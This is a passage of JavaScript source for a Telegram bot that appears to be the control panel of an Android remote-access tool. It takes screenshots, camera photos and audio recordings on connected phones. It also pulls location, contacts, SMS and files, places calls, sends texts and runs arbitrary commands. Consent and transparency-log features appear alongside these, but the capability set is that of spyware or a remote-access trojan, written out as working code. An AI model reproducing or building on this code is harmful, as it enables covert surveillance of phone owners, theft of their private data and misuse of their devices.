        const device = connectedDevices.get(deviceId);
        
        if (device) {
            setUserSession(chatId, { 
                state: 'awaiting_file_path', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, 
                `📁 *Enter file path to browse on ${deviceId.substring(0, 8)}...:*\n` +
                `Example: \`/storage/emulated/0/Downloads\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /file command
    bot.onText(/\/file (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            setUserSession(chatId, { 
                state: 'awaiting_file_path', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, 
                `📁 *Enter file path to download from ${deviceId.substring(0, 8)}...:*`,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /contacts command
    bot.onText(/\/contacts (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'get_contacts');
            bot.sendMessage(chatId, 
                `📒 *Getting contacts...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /messages command
    bot.onText(/\/messages (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'get_messages');
            bot.sendMessage(chatId, 
                `📨 *Getting messages...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /consents command
    bot.onText(/\/consents (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'get_consents', {});
            bot.sendMessage(chatId, 
                `🔐 *Fetching consent status...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /revoke command
    bot.onText(/\/revoke (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const consentType = match[2].toUpperCase();
        
        const device = connectedDevices.get(deviceId);
        if (device) {
            sendCommandToDevice(deviceId, 'revoke_consent', { 
                type: consentType,
                reason: 'Revoked by admin via Telegram command'
            });
            bot.sendMessage(chatId, 
                `🚫 *Revoking ${consentType} consent...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /revoke_all command
    bot.onText(/\/revoke_all (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'revoke_all_consents', { 
                reason: 'All consents revoked by admin via Telegram command'
            });
            bot.sendMessage(chatId, 
                `⚠️ *Revoking ALL consents...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /log command
    bot.onText(/\/log (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'get_transparency_log', { limit: 50 });
            bot.sendMessage(chatId, 
                `📋 *Fetching transparency log...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /settings command
    bot.onText(/\/settings/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        bot.sendMessage(chatId, '⚙️ *Device Settings:*', { 
            parse_mode: 'Markdown',
            reply_markup: settingsKeyboard.reply_markup 
        }).catch(e => {});
    });

    // /help command
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        showHelp(chatId);
    });

    // Interactive button handlers
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        if (chatId.toString() !== adminId) return;
        if (!text) return;
        
        const session = getUserSession(chatId);
        
        // Handle button clicks
        switch (text) {
            case '📱 List Devices':
                bot.sendMessage(chatId, '📱 *Select a device:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '🔙 Back to Main Menu':
            case '🔙 Back':
                bot.sendMessage(chatId, '🔙 *Returning to Main Menu*', { 
                    parse_mode: 'Markdown',
                    reply_markup: mainKeyboard.reply_markup 
                }).catch(e => {});
                clearUserSession(chatId);
                break;
                
            case '📸 Screenshot':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_screenshot' });
                bot.sendMessage(chatId, '📸 *Select device for screenshot:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '📍 Location':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_location' });
                bot.sendMessage(chatId, '📍 *Select device for location:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '📷 Camera':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_camera' });
                bot.sendMessage(chatId, '📷 *Select device for camera:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '📷 Front Camera':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'front' });
                    bot.sendMessage(chatId, `📷 *Taking front camera photo...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    clearUserSession(chatId);
                }
                break;
                
            case '📷 Rear Camera':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'rear' });
                    bot.sendMessage(chatId, `📷 *Taking rear camera photo...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    clearUserSession(chatId);
                }
                break;
                
            case '🎤 Record':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_record' });
                bot.sendMessage(chatId, '🎤 *Select device for recording:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '⏱️ 5 seconds':
            case '⏱️ 10 seconds':
            case '⏱️ 30 seconds':
            case '⏱️ 1 minute':
            case '⏱️ 5 minutes':
            case '⏱️ 10 minutes':
                if (session && session.deviceId) {
                    let seconds = 10;
                    if (text.includes('5 seconds')) seconds = 5;
                    if (text.includes('10 seconds')) seconds = 10;
                    if (text.includes('30 seconds')) seconds = 30;
                    if (text.includes('1 minute')) seconds = 60;
                    if (text.includes('5 minutes')) seconds = 300;
                    if (text.includes('10 minutes')) seconds = 600;
                    
                    sendCommandToDevice(session.deviceId, 'record_audio', { seconds: seconds });
                    bot.sendMessage(chatId, `🎤 *Recording ${seconds} seconds...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    clearUserSession(chatId);
                }
                break;
                
            case '📁 Files':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_files' });
                bot.sendMessage(chatId, '📁 *Select device to browse files:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '📞 Call':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_call' });
                bot.sendMessage(chatId, '📞 *Select device to make call:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '💬 SMS':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_sms' });
                bot.sendMessage(chatId, '💬 *Select device to send SMS:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '📱 Apps':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_apps' });
                bot.sendMessage(chatId, '📱 *Select device to list apps:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '🔐 Consents':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_consents' });
                bot.sendMessage(chatId, '🔐 *Select device to manage consents:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '🔐 View All Consents':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'get_consents', {});
                    bot.sendMessage(chatId, `🔐 *Fetching consent status...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '🚫 Revoke All':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_all_consents', { 
                        reason: 'Revoked by admin via Telegram button'
                    });
                    bot.sendMessage(chatId, `⚠️ *Revoking ALL consents...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '📍 Revoke Location':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'LOCATION',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking Location consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '📷 Revoke Camera':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'CAMERA',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking Camera consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '🎤 Revoke Microphone':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'MICROPHONE',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking Microphone consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '📒 Revoke Contacts':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'CONTACTS',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking Contacts consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '💬 Revoke SMS':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'SMS',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking SMS consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '📞 Revoke Calls':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'CALL_LOG',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking Call consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '📁 Revoke Storage':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'STORAGE',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking Storage consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '📸 Revoke Screenshot':
                if (session && session.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: 'SCREENSHOT',
                        reason: 'Revoked by admin via Telegram'
                    });
                    bot.sendMessage(chatId, `🚫 *Revoking Screenshot consent...*\nDevice: \`${session.deviceId.substring(0, 8)}...\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                }
                break;
                
            case '📋 Transparency Log':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ *No devices connected*', { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    return;
                }
                setUserSession(chatId, { state: 'awaiting_device_for_log' });
                bot.sendMessage(chatId, '📋 *Select device for transparency log:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '⚙️ Settings':
                bot.sendMessage(chatId, '⚙️ *Device Settings:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: settingsKeyboard.reply_markup 
                }).catch(e => {});
                break;
                
            case '❓ Help':
                showHelp(chatId);
                break;
                
            case '📥 Download':
                if (session && session.deviceId && session.filePath) {
                    sendCommandToDevice(session.deviceId, 'get_file', { path: session.filePath });
                    bot.sendMessage(chatId, `📥 *Downloading file...*\nDevice: \`${session.deviceId.substring(0, 8)}...\`\nPath: \`${session.filePath}\``, { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }).catch(e => {});
                    clearUserSession(chatId);
                }
                break;
                
            default:
                // Check if it's a device selection
                if (text.includes('📱') && text.includes('...') && session) {
                    handleDeviceSelection(chatId, text, session);
                } else if (session && session.state === 'awaiting_call_number') {
                    handleCallNumber(chatId, text, session);
                } else if (session && session.state === 'awaiting_sms_number') {
                    handleSmsNumber(chatId, text, session);
                } else if (session && session.state === 'awaiting_sms_message') {
                    handleSmsMessage(chatId, text, session);
                } else if (session && session.state === 'awaiting_command') {
                    handleCustomCommand(chatId, text, session);
                } else if (session && session.state === 'awaiting_file_path') {
                    handleFilePath(chatId, text, session);
                }
        }
    });

    // Handle callback queries
    bot.on('callback_query', (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const data = callbackQuery.data;
        
        if (chatId.toString() !== adminId) return;
        
        const [action, deviceId] = data.split('_');
        
        switch(action) {
            case 'screenshot':
                sendCommandToDevice(deviceId, 'take_screenshot');
                bot.answerCallbackQuery(callbackQuery.id, { text: '📸 Taking screenshot...' }).catch(e => {});
                bot.sendMessage(chatId, 
                    `📸 *Screenshot command sent*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
                break;
                
            case 'location':
                sendCommandToDevice(deviceId, 'get_location');
                bot.answerCallbackQuery(callbackQuery.id, { text: '📍 Getting location...' }).catch(e => {});
                bot.sendMessage(chatId, 
                    `📍 *Location command sent*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
                break;
                
            case 'camera':
                setUserSession(chatId, { 
                    state: 'awaiting_camera_type', 
                    deviceId: deviceId,
                    lastState: 'camera'
                });
                bot.sendMessage(chatId, '📷 *Select camera type:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: cameraTypeKeyboard.reply_markup 
                }).catch(e => {});
                bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
                break;
                
            case 'record':
                setUserSession(chatId, { 
                    state: 'awaiting_record_duration', 
                    deviceId: deviceId
                });
                bot.sendMessage(chatId, '🎤 *Select recording duration:*', { 
                    parse_mode: 'Markdown',
                    reply_markup: recordDurationKeyboard.reply_markup 
                }).catch(e => {});
                bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
                break;
                
            case 'files':
                setUserSession(chatId, { 
                    state: 'awaiting_file_path', 
                    deviceId: deviceId
                });
                bot.sendMessage(chatId, 
                    '📁 *Enter file path to browse:*\n' +
                    'Example: `/storage/emulated/0/Downloads`',
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }
                ).catch(e => {});
                bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
                break;
                
            case 'call':
                setUserSession(chatId, { 
                    state: 'awaiting_call_number', 
                    deviceId: deviceId
                });
                bot.sendMessage(chatId, 
                    '📞 *Enter phone number to call:*',
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }
                ).catch(e => {});
                bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
                break;
                
            case 'sms':
                setUserSession(chatId, { 
                    state: 'awaiting_sms_number', 
                    deviceId: deviceId
                });
                bot.sendMessage(chatId, 
                    '💬 *Enter phone number to send SMS:*',
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }
                ).catch(e => {});
                bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
                break;
                
            case 'apps':
                sendCommandToDevice(deviceId, 'list_apps');
                bot.answerCallbackQuery(callbackQuery.id, { text: '📱 Getting apps list...' }).catch(e => {});
                bot.sendMessage(chatId, 
                    `📱 *Apps list command sent*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
                break;
                
            case 'consents':
                sendCommandToDevice(deviceId, 'get_consents', {});
                bot.answerCallbackQuery(callbackQuery.id, { text: '🔐 Fetching consent status...' }).catch(e => {});
                bot.sendMessage(chatId, 
                    `🔐 *Consent status request sent*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
                break;
                
            case 'log':
                sendCommandToDevice(deviceId, 'get_transparency_log', { limit: 50 });
                bot.answerCallbackQuery(callbackQuery.id, { text: '📋 Fetching transparency log...' }).catch(e => {});
                bot.sendMessage(chatId, 
                    `📋 *Transparency log request sent*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
                break;
                
            case 'cmd':
                setUserSession(chatId, { 
                    state: 'awaiting_command', 
                    deviceId: deviceId
                });
                bot.sendMessage(chatId, 
                    '⚡ *Enter command to execute:*',
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: removeKeyboard.reply_markup 
                    }
                ).catch(e => {});
                bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
                break;
        }
    });
}

// Handle device selection from keyboard
function handleDeviceSelection(chatId, text, session) {
    const deviceEntry = Array.from(connectedDevices.entries()).find(([id, device]) => 
        text.includes(device.deviceInfo?.model || '') && 
        text.includes(id.substring(0, 6))
    );
    
    if (!deviceEntry) {
        bot.sendMessage(chatId, '❌ *Device not found*', { 
            parse_mode: 'Markdown',
            reply_markup: removeKeyboard.reply_markup 
        }).catch(e => {});
        clearUserSession(chatId);
        return;
    }
    
    const [deviceId, device] = deviceEntry;
    const shortId = deviceId.substring(0, 6);
    const model = device.deviceInfo?.model || 'Unknown';
    
    switch (session.state) {
        case 'awaiting_device_for_screenshot':
            sendCommandToDevice(deviceId, 'take_screenshot');
            bot.sendMessage(chatId, `📸 *Taking screenshot...*\nDevice: ${model} (\`${shortId}...\`)`, { 
                parse_mode: 'Markdown',
                reply_markup: removeKeyboard.reply_markup 
            }).catch(e => {});
            clearUserSession(chatId);
            break;
            
        case 'awaiting_device_for_location':
            sendCommandToDevice(deviceId, 'get_location');
            bot.sendMessage(chatId, `📍 *Getting location...*\nDevice: ${model} (\`${shortId}...\`)`, { 
                parse_mode: 'Markdown',
                reply_markup: removeKeyboard.reply_markup 
            }).catch(e => {});
            clearUserSession(chatId);
            break;
            
        case 'awaiting_device_for_camera':
            setUserSession(chatId, { 
                state: 'awaiting_camera_type', 
                deviceId: deviceId,
                lastState: 'camera'
            });
            bot.sendMessage(chatId, `📷 *Select camera type for ${model}:*`, { 
                parse_mode: 'Markdown',
                reply_markup: cameraTypeKeyboard.reply_markup 
            }).catch(e => {});
            break;
            
        case 'awaiting_device_for_record':
            setUserSession(chatId, { 
                state: 'awaiting_record_duration', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, `🎤 *Select recording duration for ${model}:*`, { 
                parse_mode: 'Markdown',
                reply_markup: recordDurationKeyboard.reply_markup 
            }).catch(e => {});
            break;
            
        case 'awaiting_device_for_files':
            setUserSession(chatId, { 
                state: 'awaiting_file_path', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, 
                `📁 *Enter file path to browse on ${model}:*\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `Examples:\n` +
                `• \`/storage/emulated/0/Downloads\`\n` +
                `• \`/storage/emulated/0/Pictures\`\n` +
                `• \`/storage/emulated/0/DCIM\`\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `_Or type /list for root directory_`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: removeKeyboard.reply_markup 
                }
            ).catch(e => {});
            break;
            
        case 'awaiting_device_for_call':
            setUserSession(chatId, { 
                state: 'awaiting_call_number', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, 
                `📞 *Enter phone number to call from ${model}:*\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `Format: \`+1234567890\` or \`1234567890\`\n` +
                `━━━━━━━━━━━━━━━━━━━━━`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: removeKeyboard.reply_markup 
                }
            ).catch(e => {});
            break;
            
        case 'awaiting_device_for_sms':
            setUserSession(chatId, { 
                state: 'awaiting_sms_number', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, 
                `💬 *Enter phone number to send SMS from ${model}:*\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `Format: \`+1234567890\` or \`1234567890\`\n` +
                `━━━━━━━━━━━━━━━━━━━━━`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: removeKeyboard.reply_markup 
                }
            ).catch(e => {});
            break;
            
        case 'awaiting_device_for_apps':
            sendCommandToDevice(deviceId, 'list_apps');
            bot.sendMessage(chatId, `📱 *Getting apps list...*\nDevice: ${model} (\`${shortId}...\`)`, { 
                parse_mode: 'Markdown',
                reply_markup: removeKeyboard.reply_markup 
            }).catch(e => {});
            clearUserSession(chatId);
            break;
            
        case 'awaiting_device_for_consents':
            setUserSession(chatId, { 
                state: 'consent_management', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, 
                `🔐 *Consent Management - ${model}*\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `Device ID: \`${deviceId}\`\n\n` +
                `_Select an action to manage consents:_`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: consentManagementKeyboard.reply_markup 
                }
            ).catch(e => {});
            break;
            
        case 'awaiting_device_for_log':
            sendCommandToDevice(deviceId, 'get_transparency_log', { limit: 50 });
            bot.sendMessage(chatId, `📋 *Fetching transparency log...*\nDevice: ${model} (\`${shortId}...\`)`, { 
                parse_mode: 'Markdown',
                reply_markup: removeKeyboard.reply_markup 
            }).catch(e => {});
            clearUserSession(chatId);
            break;
            
        default:
            setUserSession(chatId, { 
                state: 'device_selected', 
                deviceId: deviceId
            });
            
            const deviceMenu = `
📱 *${model}*
━━━━━━━━━━━━━━━━━━━━━
ID: \`${shortId}...\`
Android: ${device.deviceInfo?.androidVersion || 'Unknown'}
Battery: ${device.deviceInfo?.battery ? device.deviceInfo.battery.toFixed(1) + '%' : 'Unknown'}
IP: ${device.deviceInfo?.ip || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━

*AVAILABLE ACTIONS:*
            `;
            
            bot.sendMessage(chatId, deviceMenu, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
                            { text: '📍 Location', callback_data: `location_${deviceId}` }
                        ],
                        [
                            { text: '📷 Camera', callback_data: `camera_${deviceId}` },
                            { text: '🎤 Record', callback_data: `record_${deviceId}` }
                        ],
                        [
                            { text: '📁 Files', callback_data: `files_${deviceId}` },
                            { text: '📞 Call', callback_data: `call_${deviceId}` }
                        ],
                        [
                            { text: '💬 SMS', callback_data: `sms_${deviceId}` },
                            { text: '📱 Apps', callback_data: `apps_${deviceId}` }
                        ],
                        [
                            { text: '🔐 Consents', callback_data: `consents_${deviceId}` },
                            { text: '📋 Log', callback_data: `log_${deviceId}` }
                        ],
                        [
                            { text: '⚡ Command', callback_data: `cmd_${deviceId}` }
                        ]
                    ]
                }
            }).catch(e => {});
    }
}

// Handle call number input
function handleCallNumber(chatId, text, session) {
    const phoneNumber = text.trim().replace(/\s/g, '');
    
    if (!phoneNumber.match(/^[\d\-\+\(\)]{5,20}$/)) {
        bot.sendMessage(chatId, 
            '❌ *Invalid phone number format*\n' +
            'Please enter a valid number (5-20 digits):',
            { parse_mode: 'Markdown' }
        ).catch(e => {});
        return;
    }
    
    sendCommandToDevice(session.deviceId, 'make_call', { number: phoneNumber });
    bot.sendMessage(chatId, 
        `📞 *Calling ${phoneNumber}...*\n` +
        `Device: \`${session.deviceId.substring(0, 8)}...\``,
        { 
            parse_mode: 'Markdown',
            reply_markup: removeKeyboard.reply_markup 
        }
    ).catch(e => {});
    clearUserSession(chatId);
}

// Handle SMS number input
function handleSmsNumber(chatId, text, session) {
    const phoneNumber = text.trim().replace(/\s/g, '');
    
    if (!phoneNumber.match(/^[\d\-\+\(\)]{5,20}$/)) {
